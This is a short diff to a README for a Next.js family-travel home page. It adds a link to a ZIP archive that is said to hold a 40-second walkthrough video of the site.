@@ -10,6 +10,8 @@ Home Page for SA Family Travel, built with Next.js App Router, React, strict Typ
 
 ![Featured travel routes](docs/previews/routes-desktop.png)
 
+[Download the 40-second website walkthrough](https://github.com/kean346/Safamilytravel/raw/refs/heads/main/docs/videos/SA-Family-Travel-40s-1080p.zip). Extract the ZIP to play the silent 1920 × 1080 MP4 at 30 fps. This records the Home Page with the updated route photographs.
+
 ## Develop
 
 Use Node.js 22 or later (validated with Node 24.19.0 and npm 11.9.0).
